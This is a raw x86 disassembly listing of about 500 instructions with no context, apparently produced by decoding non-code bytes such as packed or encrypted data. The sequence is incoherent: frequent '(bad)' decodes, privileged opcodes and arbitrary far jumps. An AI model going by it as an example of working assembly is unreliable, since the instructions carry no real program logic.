  6ab894:	add    BYTE PTR [eax+edx*2+0x33],0x34
  6ab899:	inc    edi
  6ab89a:	shl    BYTE PTR [esi+ebx*8],1
  6ab89d:	mov    ds:0xe9f8c6f6,eax
  6ab8a2:	xchg   esp,eax
  6ab8a3:	pop    ebp
  6ab8a4:	sub    DWORD PTR [ecx],ebx
  6ab8a6:	pop    ebp
  6ab8a7:	inc    ebx
  6ab8a8:	sub    ebp,DWORD PTR [esi+0x56]
  6ab8ab:	ins    BYTE PTR es:[edi],dx
  6ab8ac:	and    DWORD PTR [edx-0x2d],edi
  6ab8af:	lock or esp,DWORD PTR ds:0x9781352
  6ab8b6:	loop   0x6ab90d
  6ab8b8:	lock xor esp,0xdb6ae8d7
  6ab8bf:	loop   0x6ab904
  6ab8c1:	call   0xcb05:0x40166cc2
  6ab8c8:	aam    0xeb
  6ab8ca:	icebp  
  6ab8cb:	arpl   WORD PTR [eax-0x1e2d7a0a],di
  6ab8d1:	sbb    eax,0xbdf7cc3d
  6ab8d6:	pop    edi
  6ab8d7:	test   DWORD PTR [edx+edi*2+0x663cfc8a],0x6d364c9d
  6ab8e2:	fisttp DWORD PTR [esi]
  6ab8e4:	mov    esi,0x3e3fd28d
  6ab8e9:	mov    al,0xe9
  6ab8eb:	and    BYTE PTR [esi],cl
  6ab8ed:	ins    BYTE PTR es:[edi],dx
  6ab8ee:	add    DWORD PTR [edi],0x6ff648bb
  6ab8f4:	push   esi
  6ab8f5:	div    DWORD PTR [edi+0x8]
  6ab8f8:	jo     0x6ab95e
  6ab8fa:	repz rcl DWORD PTR [ebx],0x76
  6ab8fe:	jns    0x6ab8cc
  6ab900:	mov    bl,0xe6
  6ab902:	clc    
  6ab903:	cld    
  6ab904:	call   0x7a61:0x8a0791dd
  6ab90b:	push   cs
  6ab90c:	dec    ebx
  6ab90d:	xchg   ecx,eax
  6ab90e:	jge    0x6ab946
  6ab910:	lea    ecx,[esi]
  6ab912:	fwait
  6ab913:	lds    esp,FWORD PTR [ecx+0x4248f9f8]
  6ab919:	push   ebx
  6ab91a:	into   
  6ab91b:	pusha  
  6ab91c:	imul   eax,DWORD PTR [ecx],0xd9a3770e
  6ab922:	add    eax,0x9a5c9e59
  6ab927:	sbb    eax,0x11322bb0
  6ab92c:	adc    al,BYTE PTR [edx+ecx*8+0xe]
  6ab930:	retf   
  6ab931:	xor    BYTE PTR [eax-0x4940e339],bh
  6ab937:	mov    esp,0x528b0d8a
  6ab93c:	mov    ebx,0x6ed5b46e
  6ab941:	cmc    
  6ab942:	xchg   esi,eax
  6ab943:	xor    DWORD PTR [eax+esi*2+0x2b1c8f14],esp
  6ab94a:	fimul  WORD PTR [ebx-0x27db141a]
  6ab950:	les    edi,FWORD PTR [edi-0x522299ef]
  6ab956:	mov    ss,edi
  6ab958:	jno    0x6ab961
  6ab95a:	out    dx,eax
  6ab95b:	js     0x6ab980
  6ab95d:	adc    eax,0xaaa24898
  6ab962:	or     bh,cl
  6ab964:	shl    esi,cl
  6ab966:	pop    edi
  6ab967:	inc    edx
  6ab968:	gs std 
  6ab96a:	sub    BYTE PTR ds:0xc1e09f18,dh
  6ab970:	int3   
  6ab971:	and    DWORD PTR [esi],ebp
  6ab973:	sub    ah,ah
  6ab975:	jne    0x6ab98a
  6ab977:	adc    eax,0x80c9676a
  6ab97c:	mov    eax,0xb51eb061
  6ab981:	test   al,0xbf
  6ab983:	ror    BYTE PTR [ebx],0x58
  6ab986:	ror    DWORD PTR [ebx],1
  6ab988:	adc    al,0x6f
  6ab98a:	ins    BYTE PTR es:[edi],dx
  6ab98b:	lea    edi,[ebp+0x1d05d0ad]
  6ab991:	leave  
  6ab992:	mov    dl,0x6d
  6ab994:	xchg   ecx,eax
  6ab996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab997:	iret   
  6ab998:	xor    dh,bl
  6ab99a:	cmp    eax,0xe5ab3707
  6ab99f:	not    BYTE PTR [esi]
  6ab9a1:	dec    ebp
  6ab9a2:	pop    esi
  6ab9a3:	add    al,0x53
  6ab9a5:	cwde   
  6ab9a6:	mov    al,0x3f
  6ab9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ab9a9:	xor    al,0xa7
  6ab9ab:	mov    al,0xc0
  6ab9ad:	add    bh,al
  6ab9af:	push   0x30cc066d
  6ab9b4:	cmp    eax,0xfd04e8f7
  6ab9b9:	push   ebp
  6ab9ba:	bound  esp,QWORD PTR [edi+0x966686]
  6ab9c0:	xchg   DWORD PTR [edx],eax
  6ab9c2:	adc    ebx,DWORD PTR [edx-0x3583505d]
  6ab9c8:	outs   dx,DWORD PTR ds:[esi]
  6ab9c9:	cmp    eax,0xbbf7bd9
  6ab9ce:	mov    al,ds:0xf00a5abd
  6ab9d3:	fwait
  6ab9d4:	sub    eax,0x6f058cc0
  6ab9d9:	pusha  
  6ab9da:	hlt    
  6ab9db:	inc    ebx
  6ab9dc:	sbb    DWORD PTR [ecx+0x2f708a59],eax
  6ab9e2:	push   0x4a
  6ab9e4:	mov    dl,0x1f
  6ab9e6:	into   
  6ab9e7:	and    dh,bh
  6ab9e9:	mov    esp,0xdba2a312
  6ab9ee:	inc    edi
  6ab9ef:	mov    edx,0x6929598c
  6ab9f4:	shld   DWORD PTR [esi],esp,0x58
  6ab9f8:	imul   esp,esp,0xffffff97
  6ab9fb:	dec    esp
  6ab9fc:	pop    eax
  6ab9fd:	cmc    
  6ab9fe:	dec    eax
  6ab9ff:	dec    esp
  6aba00:	shl    BYTE PTR [eax-0x53],0xf3
  6aba04:	sub    eax,0x37216ff9
  6aba09:	lds    esp,FWORD PTR [edx+ecx*1]
  6aba0c:	mov    al,0x37
  6aba0e:	out    dx,al
  6aba0f:	or     al,0xfc
  6aba11:	je     0x6aba52
  6aba13:	add    esi,DWORD PTR [ebx*1-0x38591228]
  6aba1a:	sar    DWORD PTR [eax],0x8d
  6aba1d:	add    bh,ah
  6aba1f:	dec    ebp
  6aba20:	les    ecx,FWORD PTR [edx*4+0x54aeed3c]
  6aba27:	and    DWORD PTR [edx],edx
  6aba29:	push   0x66afbd2e
  6aba2e:	(bad)  
  6aba2f:	jns    0x6aba6e
  6aba31:	jmp    0x6abaa9
  6aba33:	in     eax,dx
  6aba34:	jmp    0x6aba36
  6aba36:	adc    al,0x63
  6aba38:	int3   
  6aba39:	xor    al,0x81
  6aba3b:	add    BYTE PTR ds:0xa6257b69,ah
  6aba41:	adc    DWORD PTR [eax],esi
  6aba43:	ja     0x6abab7
  6aba45:	cmc    
  6aba46:	inc    ebp
  6aba47:	test   bl,dh
  6aba49:	fst    QWORD PTR [edx-0x73]
  6aba4c:	jmp    0xf1a17b67
  6aba51:	adc    eax,0x87987a01
  6aba56:	jns    0x6ab9fe
  6aba58:	sar    BYTE PTR [eax-0x4e],0xb5
  6aba5c:	div    BYTE PTR [ecx]
  6aba5e:	xchg   esi,eax
  6aba5f:	fwait
  6aba60:	pop    esp
  6aba61:	std    
  6aba62:	mov    BYTE PTR [esi],ah
  6aba64:	adc    eax,0x1bdcb292
  6aba69:	call   0xff849400
  6aba6e:	jns    0x6aba20
  6aba70:	jp     0x6aba58
  6aba72:	cld    
  6aba73:	adc    al,dl
  6aba75:	pop    ds
  6aba76:	mov    dh,0x41
  6aba78:	pusha  
  6aba79:	test   DWORD PTR [edi],edi
  6aba7b:	test   ch,bl
  6aba7d:	cmp    eax,0xea684503
  6aba82:	sub    BYTE PTR [ecx],0x25
  6aba85:	popa   
  6aba86:	cmp    ah,BYTE PTR [ebp+0xc23878a]
  6aba8c:	inc    esp
  6aba8d:	scas   eax,DWORD PTR es:[edi]
  6aba8e:	retf   
  6aba8f:	mov    ebp,DWORD PTR [edx-0x43]
  6aba92:	sub    eax,0x9aaef4de
  6aba97:	leave  
  6aba98:	not    BYTE PTR [edx]
  6aba9a:	xchg   ecx,eax
  6aba9b:	push   es
  6aba9c:	retf   
  6aba9d:	sahf   
  6aba9e:	mov    edi,0x756119f6
  6abaa3:	aaa    
  6abaa4:	mov    ds:0x7c5aa1db,eax
  6abaa9:	(bad)  
  6abaaa:	jmp    0xe32d8c8
  6abaaf:	(bad)  
  6abab0:	cs stc 
  6abab2:	mov    al,ds:0x6df11c4e
  6abab7:	and    al,0xea
  6abab9:	cmc    
  6ababa:	mov    al,0x9b
  6ababc:	jmp    0xcc71:0x7d3b3158
  6abac3:	mov    WORD PTR [ecx],ss
  6abac5:	clc    
  6abac6:	mov    ebx,0xc4106f32
  6abacb:	shl    BYTE PTR [ecx-0x2454b943],cl
  6abad1:	cmp    al,0x6b
  6abad3:	stos   BYTE PTR es:[edi],al
  6abad4:	fisttp DWORD PTR [esp+ebp*4+0x4cb59b47]
  6abadb:	adc    DWORD PTR [eax],esi
  6abadd:	ins    BYTE PTR es:[edi],dx
  6abade:	rdmsr  
  6abae0:	xor    al,0x85
  6abae2:	xor    DWORD PTR [edi-0x13],ecx
  6abae5:	data16 jno 0x6abaec
  6abae8:	push   edx
  6abae9:	or     al,0x3b
  6abaeb:	test   eax,0x7a4977f0
  6abaf0:	sbb    bh,cl
  6abaf2:	inc    ebx
  6abaf3:	cmp    al,0x33
  6abaf5:	pop    ss
  6abaf6:	pusha  
  6abaf7:	scas   eax,DWORD PTR es:[edi]
  6abaf8:	lock sub DWORD PTR [ecx],ebx
  6abafb:	cmp    eax,DWORD PTR [ebp+ebx*1-0x5a]
  6abaff:	ins    BYTE PTR es:[edi],dx
  6abb00:	mov    ebp,esi
  6abb02:	out    0x2f,al
  6abb04:	ret    
  6abb05:	out    dx,eax
  6abb06:	jmp    0x454191c7
  6abb0b:	hlt    
  6abb0c:	idiv   esi
  6abb0e:	aad    0x3d
  6abb10:	loope  0x6ababe
  6abb12:	and    DWORD PTR [edx+0x25],ebx
  6abb15:	call   FWORD PTR [ebx]
  6abb17:	and    eax,0xd26afc34
  6abb1c:	inc    ebp
  6abb1d:	mov    edi,0x6ad5f411
  6abb22:	mov    ebx,0x7320ecc2
  6abb27:	test   eax,0xa7a38a59
  6abb2c:	loopne 0x6abb78
  6abb2e:	dec    esi
  6abb2f:	mov    ds:0x3cd0a2d0,eax
  6abb34:	jns    0x6abb7f
  6abb36:	adc    DWORD PTR [edx],eax
  6abb38:	and    DWORD PTR [esi-0xc],ebx
  6abb3b:	sub    DWORD PTR [ebp+ecx*4+0x71],esi
  6abb3f:	(bad)  
  6abb40:	adc    DWORD PTR [edi+0x1d41a778],edx
  6abb46:	sub    DWORD PTR [eax],esi
  6abb48:	ror    ebx,cl
  6abb4a:	pop    ebp
  6abb4b:	call   0x3f87:0xe175ab1e
  6abb52:	xor    esi,esi
  6abb54:	dec    edx
  6abb55:	push   edi
  6abb56:	sbb    BYTE PTR [edx],cl
  6abb58:	fiadd  WORD PTR [edi+0x6854c23c]
  6abb5e:	push   ss
  6abb5f:	gs pop edi
  6abb61:	repnz stos BYTE PTR es:[edi],al
  6abb63:	push   esp
  6abb64:	mov    bl,0xc2
  6abb66:	lods   eax,DWORD PTR ds:[esi]
  6abb67:	adc    BYTE PTR [edx-0x5f72af57],dl
  6abb6d:	jge    0x6abb6f
  6abb6f:	in     eax,0x69
  6abb71:	inc    ecx
  6abb72:	jne    0x6abbaf
  6abb74:	int3   
  6abb75:	adc    DWORD PTR [esi],ecx
  6abb77:	sub    DWORD PTR [esi+0x59],esp
  6abb7a:	jo     0x6abb77
  6abb7c:	out    0x4,eax
  6abb7e:	sub    al,BYTE PTR [eax]
  6abb80:	inc    ecx
  6abb81:	push   esp
  6abb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6abb83:	es pop es
  6abb85:	push   0x60fe1dcf
  6abb8a:	cmp    al,BYTE PTR [edx]
  6abb8c:	mov    ecx,0xf2d016c
  6abb91:	pop    edi
  6abb92:	scas   eax,DWORD PTR es:[edi]
  6abb93:	sub    eax,0xb8d6ec12
  6abb98:	sub    BYTE PTR [ecx],al
  6abb9a:	mov    DWORD PTR [edi-0x3ccf92d9],edx
  6abba0:	aam    0xf2
  6abba2:	sub    DWORD PTR [ebx-0x58],eax
  6abba5:	xchg   ebp,eax
  6abba6:	dec    edi
  6abba7:	(bad)  
  6abba8:	repnz xchg edx,eax
  6abbaa:	lahf   
  6abbab:	mov    fs,WORD PTR [ebx+0x0]
  6abbae:	adc    eax,0x1e9d39fd
  6abbb3:	inc    edi
  6abbb4:	int    0xa7
  6abbb6:	ja     0x6abb79
  6abbb8:	push   cs
  6abbb9:	in     al,dx
  6abbba:	xchg   ecx,edx
  6abbbc:	sbb    eax,ebp
  6abbbe:	adc    eax,0x339cb2d7
  6abbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6abbc4:	xchg   BYTE PTR [ecx-0x879a8b1],al
  6abbca:	and    cl,BYTE PTR [edi]
  6abbcc:	add    BYTE PTR [esi+0x37],0x6a
  6abbd0:	outs   dx,BYTE PTR ds:[esi]
  6abbd1:	and    al,0xf1
  6abbd3:	cli    
  6abbd4:	dec    ecx
  6abbd5:	push   edi
  6abbd6:	mov    DWORD PTR [eax-0x7985ba9f],eax
  6abbdc:	(bad)  
  6abbdd:	div    esi
  6abbdf:	test   ah,ch
  6abbe1:	lods   al,BYTE PTR ds:[esi]
  6abbe2:	mov    BYTE PTR [esi-0x521a303e],bl
  6abbe8:	call   0xd5c7:0x2daac958
  6abbef:	fstp   QWORD PTR [eiz*4+0x3e54550e]
  6abbf6:	pop    ebp
  6abbf7:	test   BYTE PTR [ebp+0x6d],0x56
  6abbfb:	dec    edx
  6abbfc:	fnstenv [esi]
  6abbfe:	ret    
  6abbff:	jecxz  0x6abbbe
  6abc01:	and    bh,cl
  6abc03:	pop    edi
  6abc04:	jp     0x6abc82
  6abc06:	jo     0x6abc6d
  6abc08:	mov    eax,ds:0xd839d438
  6abc0d:	xor    eax,0x39907eba
  6abc12:	enter  0x1928,0x8f
  6abc16:	sahf   
  6abc17:	sahf   
  6abc18:	cvtps2pd xmm1,QWORD PTR [ebx+0x391e781c]
  6abc1f:	(bad)  
  6abc20:	clc    
  6abc21:	cmp    DWORD PTR [eax+0x73],edi
  6abc24:	cmp    al,0xb7
  6abc26:	dec    ebx
  6abc27:	inc    eax
  6abc28:	retf   
  6abc29:	cmp    DWORD PTR [ebp+0x5f],ebx
  6abc2c:	and    al,0x30
  6abc2e:	pop    edx
  6abc2f:	ss hlt 
  6abc31:	xchg   esi,eax
  6abc32:	adc    al,0x6b
  6abc34:	jmp    0xc633:0x1e5e6593
  6abc3b:	lods   al,BYTE PTR ds:[esi]
  6abc3c:	mov    ecx,0xe4036c42
  6abc41:	stos   DWORD PTR es:[edi],eax
  6abc42:	dec    ebp
  6abc43:	push   ds
  6abc44:	inc    ecx
  6abc45:	mov    es,WORD PTR [eax+0xde07e14]
  6abc4b:	stc    
  6abc4c:	pop    ds
  6abc4d:	ss out 0xc9,eax
  6abc50:	jle    0x6abcab
  6abc52:	scas   eax,DWORD PTR es:[edi]
  6abc53:	mov    ds:0x118d23f6,al
  6abc58:	xor    ebx,DWORD PTR [edx]
  6abc5a:	test   BYTE PTR [ebx+0x67],bl
  6abc5d:	xchg   ecx,eax
  6abc5e:	add    ebp,DWORD PTR [eax]
  6abc60:	jae    0x6abcc3
  6abc62:	ins    BYTE PTR es:[edi],dx
  6abc63:	iret   
  6abc64:	imul   edx,DWORD PTR [esi+0x3c],0x4b
  6abc68:	fidivr DWORD PTR [eax-0x62]
  6abc6b:	lods   eax,DWORD PTR ds:[esi]
  6abc6c:	mov    eax,ds:0x2ca340a8
  6abc71:	mov    ds:0x92dc0c6c,eax
  6abc76:	and    al,0x37
  6abc78:	loope  0x6abcc3
  6abc7a:	cli    
  6abc7b:	mov    WORD PTR [edx+0x26],es
  6abc7e:	stos   BYTE PTR es:[edi],al
  6abc7f:	dec    esi
  6abc80:	test   dl,bh
  6abc82:	cli    
  6abc83:	push   eax
  6abc84:	xchg   esp,eax
  6abc85:	call   0xb1045004
  6abc8a:	loop   0x6abd01
  6abc8c:	xchg   esi,eax
  6abc8d:	pop    es
  6abc8e:	push   0x46
  6abc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6abc91:	loopne 0x6abcea
  6abc93:	fcom   DWORD PTR [ecx+0x738138c4]
  6abc99:	inc    ebx
  6abc9a:	xor    ebp,ecx
  6abc9c:	sbb    BYTE PTR [edx+0x6170d15],ch
  6abca2:	sar    DWORD PTR [edx+ecx*2],1
  6abca5:	iret   
  6abca6:	adc    DWORD PTR [ecx],ebx
  6abca8:	push   ss
  6abca9:	les    edx,FWORD PTR [ebx+0x61f223c]
  6abcaf:	pushf  
  6abcb0:	cld    
  6abcb1:	adc    bl,BYTE PTR [esi+0x3072d5b6]
  6abcb7:	adc    bh,BYTE PTR [ebx-0x669e3f13]
  6abcbd:	and    al,0x5
  6abcbf:	cdq    
  6abcc0:	ja     0x6abcd9
  6abcc2:	pop    ebp
  6abcc3:	js     0x6abca4
  6abcc5:	mov    ch,0x76
  6abcc7:	fwait
  6abcc8:	or     al,0xf8
  6abcca:	sbb    edx,DWORD PTR [edx+edi*8-0x5d52d581]
  6abcd1:	int    0xfe
  6abcd3:	(bad)  
  6abcd4:	pop    edi
  6abcd5:	popa   
  6abcd6:	sbb    ch,ah
  6abcd8:	push   ss
  6abcd9:	sar    eax,cl
  6abcdb:	and    eax,0x6ac90a6c
  6abce0:	stos   BYTE PTR es:[edi],al
  6abce1:	mov    ebx,0xe191126
  6abce6:	xchg   ebx,eax
  6abce7:	and    BYTE PTR [edi+edx*4-0x5a],bl
  6abceb:	pop    ss
  6abcec:	xchg   DWORD PTR [ebx+edi*4],ebx
  6abcef:	sub    eax,0x67fac13
  6abcf4:	mov    ch,0x33
  6abcf6:	popa   
  6abcf7:	fiadd  DWORD PTR [ebp-0x1]
  6abcfa:	nop
  6abcfb:	push   edi
  6abcfc:	das    
  6abcfd:	mov    dl,0x63
  6abcff:	fs push ss
  6abd01:	repnz inc ecx
  6abd03:	lock ins DWORD PTR es:[edi],dx
  6abd05:	arpl   WORD PTR [edx-0x60be5f74],cx
  6abd0b:	test   DWORD PTR [edi+0x6f],eax
  6abd0e:	mov    al,0x14
  6abd10:	mov    cl,0x3d
  6abd12:	pop    esp
  6abd13:	mov    al,ds:0xeb20e693
  6abd18:	adc    DWORD PTR [ecx],0x2925ddcf
  6abd1e:	or     edx,DWORD PTR [ebx+eiz*2-0x23]
  6abd22:	cdq    
  6abd23:	push   ds
  6abd24:	adc    BYTE PTR [ecx-0xf3f40bd],cl
  6abd2a:	push   cs
  6abd2b:	pushf  
  6abd2c:	cmc    
  6abd2d:	push   ds
  6abd2e:	in     al,dx
  6abd2f:	out    dx,eax
  6abd30:	inc    ecx
  6abd31:	test   dl,ch
  6abd33:	or     ah,dl
  6abd35:	mov    ds,WORD PTR [esi+0x7e68c657]
  6abd3b:	xchg   esi,eax
  6abd3c:	pusha  
  6abd3d:	pop    edx
  6abd3e:	mov    ebp,0xcbe2011b
  6abd43:	add    al,0xb9
  6abd45:	std    
  6abd46:	mov    dh,al
  6abd48:	lock or BYTE PTR [edi-0xb3957c8],0xcd
  6abd50:	pop    edx
  6abd51:	fs retf 
  6abd53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6abd54:	jns    0x6abd81
  6abd56:	pop    esi
  6abd57:	out    0x16,al
  6abd59:	(bad)  
  6abd5b:	cld    
  6abd5c:	jno    0x6abdbc
  6abd5e:	push   0x57
  6abd60:	jmp    0x6abd49
  6abd62:	push   cs
  6abd63:	pop    ebx
  6abd64:	adc    bh,BYTE PTR gs:[eax-0x7dd8cda1]
  6abd6b:	add    eax,0xa86cdbe4
  6abd70:	scas   al,BYTE PTR es:[edi]
  6abd71:	jo     0x6abdd1
  6abd73:	(bad)  
  6abd74:	clc    
  6abd75:	pop    edx
  6abd76:	add    eax,0xa08f1db4
  6abd7b:	(bad)  
  6abd7c:	xchg   edi,eax
  6abd7d:	out    0x31,eax
  6abd7f:	adc    DWORD PTR [esi-0x60fe5be],eax
  6abd85:	pop    edi
  6abd86:	out    dx,eax
  6abd87:	jge    0x6abdfd
  6abd89:	mov    ds:0x31c14bf4,eax
  6abd8e:	and    eax,0x601ca92
  6abd93:	push   0x15
  6abd95:	test   al,0x50
  6abd97:	pop    ecx
  6abd98:	call   0xb757d21e
  6abd9d:	pop    esi
  6abd9e:	dec    eax
  6abd9f:	push   0xffffff91
  6abda1:	mov    DWORD PTR [ebx],ebp
  6abda3:	jns    0x6abe22
  6abda5:	(bad)
  6abda9:	cmp    al,0x3c
  6abdab:	stos   DWORD PTR es:[edi],eax
  6abdac:	arpl   WORD PTR [esi],ax
  6abdae:	jge    0x6abdda
  6abdb0:	cmp    DWORD PTR [eax],esi
  6abdb2:	or     DWORD PTR [ecx+0x24],0xffffff9c
  6abdb6:	test   al,0x33
  6abdb8:	mov    ebp,0x9a985c
  6abdbd:	or     BYTE PTR [eax+0x1afca751],0x3d
  6abdc4:	(bad)  
  6abdc6:	mov    eax,0x6c842e9e
  6abdcb:	xor    al,0x98
  6abdcd:	cld    
  6abdce:	adc    DWORD PTR [edx-0x2d],edi
  6abdd1:	pop    esp
  6abdd2:	rcr    bl,cl
  6abdd4:	jp     0x6abd78
  6abdd6:	push   ebp
  6abdd7:	loop   0x6abd6e
  6abdd9:	xor    BYTE PTR [ebx+eax*8],al
  6abddc:	mov    ebp,0xf261de4e
  6abde1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6abde2:	sti    
  6abde3:	mov    esp,0xf45bca40
  6abde8:	nop
  6abde9:	jnp    0x6abe41
  6abdeb:	adc    eax,DWORD PTR [ebx+eiz*8+0x62]
  6abdef:	daa    
  6abdf0:	fisub  DWORD PTR [ecx+0x2a]
  6abdf3:	sbb    BYTE PTR [edi-0x338d7112],dl
  6abdf9:	out    dx,al
  6abdfa:	push   0xffffffc6
  6abdfc:	xor    eax,0x10f59693
  6abe01:	cs jmp 0x6abe6b
  6abe04:	sbb    DWORD PTR [esp+eiz*4-0x22],esi
  6abe08:	xchg   ecx,eax
  6abe09:	push   ebx
  6abe0a:	mov    ds:0xbe2f7a02,eax
  6abe0f:	loopne 0x6abdca
  6abe11:	push   ds
  6abe12:	in     al,dx
  6abe13:	ja     0x6abe57
  6abe15:	fimul  WORD PTR [eax-0xd]
  6abe18:	and    al,0x2e
  6abe1a:	dec    ebx
  6abe1b:	adc    DWORD PTR [eax-0x42fdd8d0],edi
  6abe21:	std    
  6abe22:	sub    eax,0xb5e5d332
  6abe27:	push   ds
  6abe28:	sbb    BYTE PTR ds:0x5ea38c14,dh
  6abe2e:	push   edx
  6abe2f:	mov    al,0x24
  6abe31:	xor    ch,BYTE PTR [esi]
  6abe33:	mov    edi,0xa059de2
  6abe38:	and    dh,BYTE PTR [edx]
  6abe3a:	stos   DWORD PTR es:[edi],eax
  6abe3b:	ins    BYTE PTR es:[edi],dx
  6abe3c:	je     0x6abeb2
  6abe3e:	shr    ebp,cl
  6abe40:	ja     0x6abea0
  6abe42:	sbb    BYTE PTR cs:[ebx-0x56784abd],0xed
  6abe4a:	mov    al,fs:0x31c4f5b
  6abe50:	mov    ebp,0x7c1ca9b5
  6abe55:	or     ah,BYTE PTR [esi-0x3b]
  6abe58:	aad    0xc7
  6abe5a:	jl     0x6abe55
  6abe5c:	ret    0xbe89
  6abe5f:	ja     0x6abe9c
  6abe61:	vmwrite ecx,DWORD PTR [ebx+0x763d1e91]
  6abe68:	cmp    bl,BYTE PTR [eax]
  6abe6a:	and    esi,ecx
  6abe6c:	(bad)  [ebx]
  6abe6e:	lods   al,BYTE PTR ds:[esi]
  6abe6f:	lods   eax,DWORD PTR ds:[esi]
  6abe70:	inc    edi
  6abe71:	inc    ebp
  6abe72:	test   eax,0xda057181
  6abe77:	jae    0x6abea7
  6abe79:	mov    BYTE PTR [ebx],bh
  6abe7b:	adc    DWORD PTR [eax+0x6e],edx
  6abe7e:	pop    es
  6abe7f:	bnd jns 0x6abec0
  6abe82:	out    0xbf,eax
  6abe84:	adc    al,0x11
  6abe86:	hlt    
  6abe87:	adc    eax,0xdbf9df4e
  6abe8c:	int3   
  6abe8d:	dec    ecx
  6abe8e:	out    dx,eax
  6abe8f:	mov    ebp,0xb6c01393
  6abe94:	(bad)  
  6abe95:	std    
  6abe96:	jno    0x6abe89
  6abe98:	repnz mov al,ds:0x6c79627f
  6abe9e:	adc    DWORD PTR [ecx+eax*8+0x5cbf827a],ebp
  6abea5:	mov    al,0x1b
  6abea7:	and    DWORD PTR [ebx+0x61],edx
  6abeaa:	jmp    0x6abe40
  6abeac:	ss xor cl,ch
  6abeaf:	out    0x9a,al
  6abeb1:	sbb    esi,DWORD PTR [ebp+0x28]
  6abeb4:	cmp    esi,eax
  6abeb6:	adc    BYTE PTR [eax],cl
  6abeb8:	loopne 0x6abe5a
  6abeba:	into   
  6abebb:	jbe    0x6abec2
  6abebd:	jp     0x6abee0
  6abebf:	shl    BYTE PTR [ebx],0x98
  6abec2:	mov    es,WORD PTR [ecx]
  6abec4:	in     eax,0xb7
  6abec6:	or     bl,bh
  6abec8:	fisubr WORD PTR [ecx-0x29]
  6abecb:	jp     0x6abea8
  6abecd:	fisub  WORD PTR [ecx-0x7e037c7f]
  6abed3:	in     al,dx
  6abed4:	push   0xae4fc048
  6abed9:	cmp    BYTE PTR [edi],0xd6
  6abedc:	lock cli 
  6abede:	fcomp  DWORD PTR [ecx-0x1b81b031]
  6abee4:	popf   
  6abee5:	ins    BYTE PTR es:[edi],dx
  6abee6:	push   ebx
  6abee7:	shr    BYTE PTR [esi+esi*2-0x12e81a1e],0xaf
  6abeef:	in     eax,0xf2
  6abef1:	lods   eax,DWORD PTR ds:[esi]
  6abef2:	mov    ah,0xc3
  6abef4:	in     al,0xb9
  6abef6:	int    0x72
  6abef8:	cmc    
  6abef9:	and    al,0xe3
  6abefb:	retf   
  6abefc:	lds    eax,FWORD PTR [edi]
  6abefe:	shr    BYTE PTR [edi],cl
  6abf00:	adc    al,0x45
  6abf02:	push   ecx
  6abf03:	mov    ecx,0xf27a69be
  6abf08:	out    0x3b,al
  6abf0a:	push   esi
  6abf0b:	cmp    eax,0xadc032dd
  6abf10:	fcomip st,st(0)
  6abf12:	test   al,0xc6
  6abf14:	scas   al,BYTE PTR es:[edi]
  6abf15:	ins    BYTE PTR es:[edi],dx
  6abf16:	fdiv   QWORD PTR [ebp-0x5b]
  6abf19:	mov    WORD PTR [ecx],ss
  6abf1b:	mov    eax,0x3e4baa96
  6abf20:	jp     0x6abf06
  6abf22:	pop    eax
  6abf23:	pop    ecx
  6abf24:	das    
  6abf25:	shl    DWORD PTR [eax],cl
  6abf27:	sbb    eax,0x408d5dca
  6abf2c:	cdq    
  6abf2d:	jp     0x6abf92
  6abf2f:	add    DWORD PTR [ebp+0x6b91d25],esp
  6abf35:	and    eax,0x4bd4da71
  6abf3a:	adc    al,0xe0
  6abf3c:	lea    esi,[eax+0x674dbc8a]
  6abf42:	sub    cl,cl
  6abf44:	cdq    
  6abf45:	psllw  mm3,mm4
  6abf48:	in     al,0x91
  6abf4a:	scas   al,BYTE PTR es:[edi]
  6abf4b:	pop    edx
  6abf4c:	imul   ebp,DWORD PTR [esi],0xcfe5b628
  6abf52:	sbb    BYTE PTR [eax-0x6],bl
  6abf55:	imul   edx,ecx,0xbe982769
  6abf5b:	pop    edx
  6abf5c:	inc    esp
  6abf5d:	aam    0xa
  6abf5f:	dec    eax
  6abf60:	or     bh,0x8e
  6abf63:	cmp    esp,DWORD PTR [ebp+0x16]
  6abf66:	cwde   
  6abf67:	jns    0x6abf17
  6abf69:	cmp    ch,BYTE PTR [ebp-0x31696bb9]
  6abf6f:	lahf   
  6abf70:	arpl   WORD PTR [ebp+0x23],bp
  6abf73:	ja     0x6abf8f
  6abf75:	xchg   esp,eax
  6abf76:	sar    edx,0x43
  6abf79:	inc    ebp
  6abf7a:	(bad)  
  6abf7b:	popa   
  6abf7c:	into   
  6abf7d:	mov    al,0x1d
  6abf7f:	fisttp WORD PTR [ecx-0x3ce3f02a]
  6abf85:	pop    ebx
  6abf86:	popf   
  6abf87:	fwait
  6abf88:	dec    DWORD PTR [esp+ecx*2]
  6abf8b:	in     eax,0x1b
  6abf8d:	fdiv   QWORD PTR [eax-0x5a]
  6abf90:	jnp    0x6abfc5
  6abf92:	(bad)  
  6abf93:	mov    ebx,0x7f958ee4
  6abf98:	pop    esi
  6abf99:	js     0x6abfac
  6abf9b:	daa    
  6abf9c:	retf   0x69e2
  6abf9f:	les    ebp,FWORD PTR [esi-0x22a66f88]
  6abfa5:	nop
  6abfa6:	mov    ds:0xda720ee7,eax
  6abfab:	cmp    BYTE PTR [ebp-0x38103da7],cl
  6abfb1:	sub    bh,BYTE PTR [ebx+0x4c03c71c]
  6abfb7:	(bad)  
  6abfb8:	xor    BYTE PTR [ecx+edi*8],ah
  6abfbb:	arpl   WORD PTR [ecx+edx*2-0x65837a51],ax
  6abfc2:	(bad)  
  6abfc3:	jbe    0x6abf82
  6abfc5:	rcl    DWORD PTR [edx],0x8b
  6abfc8:	push   esi
  6abfc9:	test   al,0x42
  6abfcb:	or     al,0xb1
  6abfcd:	jmp    DWORD PTR [ebx+0x31fde75e]
  6abfd3:	adc    esi,DWORD PTR [ebx]
  6abfd5:	cmp    eax,0x938df722
  6abfda:	add    BYTE PTR [eax-0x13],dl
  6abfdd:	div    DWORD PTR [edx-0x4a]
  6abfe0:	xchg   DWORD PTR [esi+0x79],ebp
  6abfe3:	xor    al,0x97
  6abfe6:	push   0x472aa42b
  6abfeb:	daa    
  6abfec:	(bad)  
  6abfed:	jo     0x6abfc0
  6abfef:	ret    
